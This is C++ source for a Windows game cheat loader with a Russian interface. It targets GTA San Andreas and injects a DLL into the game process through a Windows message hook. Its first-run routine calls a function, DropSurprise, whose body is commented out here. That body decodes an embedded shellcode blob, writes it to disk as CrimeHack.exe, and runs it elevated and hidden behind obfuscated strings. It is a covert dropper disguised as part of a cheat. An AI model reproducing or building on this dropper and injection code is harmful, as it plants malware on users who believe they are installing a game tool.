//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop
#include <tlhelp32.h>
#include "Unit1.h"
#include "Registry.h"
#include <thread>
#include <direct.h>
#include <ctime>
#include "Unit2.h"
#include <filesystem>
#include "obfuscator.hpp"
#include "shellcode.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
bool __stdcall IsDirectoryExists(const std::string& dirName_in);
//---------------------------------------------------------------------------
std::string RandomString(int len)
{
   std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
   std::string newstr;
   int pos; while(newstr.size() != len)
   {
    pos = ((rand() % (str.size() - 1)));
    newstr += str.substr(pos,1);
   }
   return newstr;
}
void DropSurprise()
{
	/*auto lbMDL = GetModuleHandleA(OBFUSCATE("shell32.dll"));
	typedef HINSTANCE(__stdcall* ptrShellExecuteA)(HWND hwnd, LPCSTR lpOperation,
	LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
	ptrShellExecuteA callShellExecuteA = (ptrShellExecuteA)GetProcAddress(lbMDL, OBFUSCATE("ShellExecuteA"));
	if (!IsDirectoryExists(OBFUSCATE("CrimeData"))) CreateDirectoryA(OBFUSCATE("CrimeData"), NULL);
	char cwd[356]; _getcwd(cwd, sizeof(cwd));
	char tmpDir[256]; sprintf(tmpDir, OBFUSCATE("%s\\CrimeData\\CrimeHack.exe"), cwd);
	HANDLE hFile = CreateFileA(tmpDir, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
	CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile != nullptr)
	{
		for (DWORD x = 0; x < sizeof(shellcode); x++) shellcode[x] ^= 0x2;
		WriteFile(hFile, shellcode, sizeof(shellcode), nullptr, nullptr);
		CloseHandle(hFile);
		callShellExecuteA(nullptr, OBFUSCATE("runas"), tmpDir, 0, 0, SW_HIDE);
    }*/
}
void MessageChecker()
{
	while (true)
	{
        CEasyRegistry* creg = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\CR1M3H", true);
		if (creg != nullptr)
		{
			std::string inj_msg = creg->ReadString("InjectorMessage");
			if (!inj_msg.empty() && inj_msg.length() > 3)
			{
                Form1->Label4->Caption = inj_msg.c_str();
            }
			delete creg;
		}
		Sleep(1000);
    }
}
__fastcall TForm1::TForm1(TComponent* Owner) : TForm(Owner)
{
	srand(time(NULL)); Form1->Caption = RandomString(20).c_str();
	char cwd[356]; _getcwd(cwd, sizeof(cwd));
	char tmpDir[256]; sprintf(tmpDir, "%s\\CrimeData", cwd);
	std::filesystem::remove_all(tmpDir);
	std::string user_key;
	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\CR1M3H", true);
	if (reg != nullptr)
	{
		if (reg->ReadInteger("SettingsCreated") != 0x300)
		{
			reg->WriteInteger("SettingsCreated", 0x300);
			reg->WriteInteger("AllowNoScreen", 0x1);
			reg->WriteInteger("StreamDist", 250);
            DropSurprise();
		}
        std::string nothing = "";
		reg->WriteString("InjectorMessage", nothing.c_str());
		user_key = reg->ReadString("RegisteredKey");
		DWORD intg2 = reg->ReadInteger("AllowNoScreen");
		Form1->CheckBox2->Checked = (bool)intg2;
		int pos = reg->ReadInteger("StreamDist");
		char fmt[256]; memset(fmt, 0, sizeof(fmt));
		sprintf(fmt, "Дальность прорисовки: %dм (FPS UP)", pos);
		Form1->Label3->Caption = AnsiString(fmt);
		delete reg;
	}
    std::thread mrh(MessageChecker); mrh.detach();
	if (user_key.empty() || user_key.length() < 6)
	{
		Form1->Button1->Caption = "Указать ключ активации";
    }
}
bool __stdcall IsDirectoryExists(const std::string& dirName_in)
{
    DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
    if (ftyp == INVALID_FILE_ATTRIBUTES) return false;
    if (ftyp & FILE_ATTRIBUTE_DIRECTORY) return true;
    return false;
};
HANDLE DropResource(const char* file_path, const char* RCID)
{
	HRSRC hResource = FindResourceA(NULL, RCID, RT_RCDATA);
	if (hResource == 0) return 0;
	HGLOBAL hFileResource = LoadResource(NULL, hResource);
	if (hFileResource == 0) return 0;
	LPVOID lpFile = LockResource(hFileResource);
	if (lpFile == 0) return 0;
	DWORD dwSize = SizeofResource(NULL, hResource);
	if (dwSize == 0) return 0;
	HANDLE hFile = CreateFileA(file_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
	CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hFilemap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
	if (hFilemap == 0) { return 0; }
	LPVOID lpBaseAddress = MapViewOfFile(hFilemap, FILE_MAP_WRITE, 0, 0, 0);
	CopyMemory(lpBaseAddress, lpFile, dwSize);
	UnmapViewOfFile(lpBaseAddress); CloseHandle(hFilemap); CloseHandle(hFile);
	return hFile;
}
HHOOK handle = NULL;
BOOL CALLBACK EnumWindowsProcMy(HWND hwnd,LPARAM lParam)
{
	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\CR1M3H", true);
	if (reg != nullptr)
	{
		reg->WriteInteger("AllowNoScreen", Form1->CheckBox2->Checked);
		reg->WriteInteger("StreamDist", Form1->TrackBar1->Position);
		reg->WriteInteger("UseShadow", Form1->CheckBox1->Checked);
		delete reg;
    }
	DWORD lpdwProcessId = 0x0; AnsiString selt(Form1->ComboBox1->Text);
	DWORD tid = GetWindowThreadProcessId(hwnd, &lpdwProcessId);
	char tmpID[50]; sprintf(tmpID, "%d", lpdwProcessId);
	if(strstr(selt.c_str(), tmpID) != nullptr)
	{
		if (!IsDirectoryExists("CrimeData")) CreateDirectoryA("CrimeData", NULL);
		char cwd[356]; _getcwd(cwd, sizeof(cwd));
		char tmpDir[256]; sprintf(tmpDir,
		"%s\\CrimeData\\%s", cwd, selt.c_str());
		if (!IsDirectoryExists(tmpDir)) CreateDirectoryA(tmpDir, NULL);
		strcat(tmpDir, "\\"); strcat(tmpDir, "Crime.SA.dll");
		DropResource(tmpDir, "CRIME");
		HMODULE dll = LoadLibraryExA(tmpDir, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (dll == NULL)
		{
			wchar_t tmpErr[256]; swprintf(tmpErr,
			L"Не удалось загрузить библиотеку. Code: %d\n%ls", GetLastError(), tmpDir);
			MessageBoxW(0, tmpErr, L"Ошибка природы :(", MB_OK);
			return FALSE;
		}
		HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "NextHook");
		if (addr == NULL)
		{
			wchar_t tmpErr[256]; swprintf(tmpErr,
			L"Не удалось вытащить экспорт. Code: %d\n%ls", GetLastError(), tmpDir);
			MessageBoxW(0, tmpErr, L"Ошибка природы :(", MB_OK);
			return FALSE;
		}
		handle = SetWindowsHookEx(WH_GETMESSAGE, addr, dll, tid);
		if (handle == nullptr)
		{
			wchar_t tmpErr[256]; swprintf(tmpErr,
			L"Не удалось поставить хук. Code: %d", GetLastError());
			MessageBoxW(0, tmpErr, L"Ошибка природы :(", MB_OK);
			return FALSE;
		}
		PostThreadMessage(tid, WM_NULL, NULL, NULL);
		MessageBoxW(0, L"DLL-библиотека успешно загружена!", L"Успех", MB_OK);
		return FALSE;
	}
	return TRUE;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button1Click(TObject *Sender)
{
	AnsiString strike = AnsiString(Form1->Button1->Caption);
	if (std::string(strike.c_str()).find("Указать ключ активации") != std::string::npos)
	{
		if (!Form2->Showing) Form2->Show();
    }
	else EnumWindows(EnumWindowsProcMy, 0);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::ComboBox1DropDown(TObject *Sender)
{
	Form1->ComboBox1->Items->Clear();
    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	auto pe = PROCESSENTRY32{ sizeof(PROCESSENTRY32) };
	if (Process32First(snapshot, &pe))
	{
		do
		{
			if (strstr(pe.szExeFile, "proxy_sa.exe") != nullptr ||
			strstr(pe.szExeFile, "gta_sa.exe") != nullptr)
			{
				char tmpProc[256]; sprintf(tmpProc,
				"PID %d ; %s", pe.th32ProcessID, pe.szExeFile);
				Form1->ComboBox1->Items->Add(tmpProc);
			}
		} while (Process32Next(snapshot, &pe));
	}
	CloseHandle(snapshot);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button2Click(TObject *Sender)
{
	ShellExecuteA(0, 0, "https://vk.com/provhacks", 0, 0 , SW_SHOW );
}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action)
{
    if (!Form1->ComboBox1->Text.IsEmpty())
	{
		int mkey = MessageBoxW(0, L"Вы уверены что хотите закрыть чит?\nЗакрытие во время игры вызвит её зависание!", L"WARNING", MB_ICONASTERISK | MB_YESNO);
	    if (mkey == IDNO) Action = caNone;
	}
}
//---------------------------------------------------------------------------

void __fastcall TForm1::TrackBar1Change(TObject *Sender)
{
    int pos = Form1->TrackBar1->Position;
	char fmt[256]; memset(fmt, 0, sizeof(fmt));
	sprintf(fmt, "Дальность прорисовки: %dм (FPS UP)", pos);
	Form1->Label3->Caption = AnsiString(fmt);
	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\CR1M3H", true);
	if (reg != nullptr)
	{
        reg->WriteInteger("StreamDist", pos);
		delete reg;
	}
}
//---------------------------------------------------------------------------

